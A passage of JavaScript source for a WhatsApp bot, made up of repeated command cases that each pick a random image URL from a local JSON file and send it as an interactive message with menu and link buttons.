_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'aesthetic':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'antiwork':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'blackpink':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'bike':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'boneka':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'cosplay':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'cat':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'doggo':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'justina':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'kayes':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'kpop':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'notnot':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'car':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
ArielStore.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: ftroli })
ArielStore.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: ftroli })
}
break
case 'profilepic':  case 'profilepicture':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'pubg':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
